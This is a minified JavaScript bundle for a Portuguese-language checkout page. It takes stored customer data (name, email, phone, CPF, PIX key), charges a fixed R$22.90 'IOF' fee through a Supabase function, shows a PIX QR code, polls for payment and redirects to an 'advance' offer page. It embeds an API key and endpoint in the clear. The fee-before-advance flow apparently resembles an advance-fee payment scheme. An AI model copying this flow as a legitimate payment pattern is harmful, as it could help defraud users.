import{i as y,r as f}from"./utm-helper-C4jEGc4L.js";y();const l="https://tbmhixbambsdenkxjdlz.supabase.co",p="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRibWhpeGJhbWJzZGVua3hqZGx6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ5NzQwMjUsImV4cCI6MjA4MDU1MDAyNX0.C3xXc9utoJFguYXSEHtSEjI4p6Shnx7e3tfmK5o7dP4",g=22.9;let I=null,i=null;document.addEventListener("DOMContentLoaded",function(){const n=document.getElementById("iof-terms-checkbox"),e=document.getElementById("iof-pay-button"),t=document.getElementById("pix-back-button"),a=document.getElementById("pix-copy-button");n.addEventListener("change",function(){this.checked?(e.disabled=!1,e.classList.remove("iof-button-disabled")):(e.disabled=!0,e.classList.add("iof-button-disabled"))}),e.addEventListener("click",async function(){n.checked&&await x()}),t.addEventListener("click",function(){m()}),a.addEventListener("click",function(){const o=document.getElementById("pix-code-input"),s=document.getElementById("pix-code-copied");o.select(),document.execCommand("copy"),navigator.clipboard.writeText(o.value).then(()=>{s.style.display="block",setTimeout(()=>{s.style.display="none"},3e3)}).catch(c=>{console.error("Erro ao copiar:",c),alert("Código copiado para a área de transferência!")})})});async function x(){const n=document.getElementById("iof-screen"),e=document.getElementById("pix-screen"),t=e.querySelector(".pix-preloader-container"),a=e.querySelector(".pix-payment-wrapper");n.style.display="none",e.style.display="block",t.style.display="flex",a.style.display="none";try{const o=E(),s=`${l}/functions/v1/create-pix`,c={Authorization:`Bearer ${p}`,"Content-Type":"application/json"},u={customerName:o.nome||"Cliente",customerEmail:o.email||"cliente@email.com",customerPhone:o.telefone||"11999999999",customerDocument:o.cpf||o.chavePix||"00000000000",pixKey:o.chavePix||"",pixKeyType:o.tipoChave||"cpf",transactionType:"iof",amount:Math.round(g*100)},d=await fetch(s,{method:"POST",headers:c,body:JSON.stringify(u)}),r=await d.json();if(!d.ok||!r.success)throw new Error(r.error||"Erro ao criar PIX");I=r,h(r.qrcode,r.transactionId),t.style.display="none",a.style.display="flex",v(r.transactionId)}catch(o){console.error("Erro ao gerar PIX:",o),alert("Erro ao gerar PIX. Tente novamente."),m()}}function h(n,e){const t=document.getElementById("pix-qrcode"),a=document.getElementById("pix-code-input");t.innerHTML="",setTimeout(()=>{try{typeof QRCode<"u"?(new QRCode(t,{text:n,width:250,height:250,colorDark:"#000000",colorLight:"#ffffff",correctLevel:QRCode.CorrectLevel.H}),console.log("QR Code gerado com sucesso")):(console.error("Biblioteca QRCode não está disponível"),t.innerHTML='<div style="background: #fee2e2; padding: 20px; border-radius: 8px; text-align: center;"><p style="color: #dc2626; font-size: 14px; margin: 0;">QR Code indisponível. Use o código Pix abaixo.</p></div>')}catch(o){console.error("Erro ao gerar QR Code:",o),t.innerHTML='<div style="background: #fee2e2; padding: 20px; border-radius: 8px; text-align: center;"><p style="color: #dc2626; font-size: 14px; margin: 0;">Erro ao gerar QR Code. Use o código Pix abaixo.</p></div>'}},100),a.value=n}function v(n){i&&clearInterval(i),console.log(`[IOF] Iniciando verificação de pagamento para transação: ${n}`);let e=0;const t=120;i=setInterval(async()=>{if(e++,e>=t){console.log(`[IOF] Máximo de tentativas (${t}) atingido`),clearInterval(i);return}try{const a=`${l}/functions/v1/check-payment`,o={Authorization:`Bearer ${p}`,"Content-Type":"application/json"},c=await(await fetch(a,{method:"POST",headers:o,body:JSON.stringify({transactionId:n}),signal:AbortSignal.timeout(1e4)})).json();console.log(`[IOF] Tentativa ${e}/${t} - Status: ${c.status}`),(c.status==="paid"||c.status==="approved")&&(console.log("[IOF] Pagamento confirmado! Redirecionando..."),clearInterval(i),b())}catch(a){console.error(`[IOF] Erro ao verificar pagamento (tentativa ${e}):`,a)}},3e3)}window.addEventListener("beforeunload",()=>{i&&clearInterval(i)});document.addEventListener("visibilitychange",()=>{document.hidden?console.log("[IOF] Página em background - polling continua"):console.log("[IOF] Página voltou ao foco")});function b(){f("./oferta-antecipacao.html")}function m(){const n=document.getElementById("iof-screen"),e=document.getElementById("pix-screen");i&&clearInterval(i),e.style.display="none",n.style.display="block"}function E(){const n=["customerData","pixFormData","userData"];for(const e of n){const t=localStorage.getItem(e);if(t)try{return JSON.parse(t)}catch(a){console.error(`Erro ao parsear ${e}:`,a)}}return{nome:"Cliente",email:"cliente@email.com",telefone:"11999999999",cpf:"00000000000",chavePix:"",tipoChave:"cpf"}}
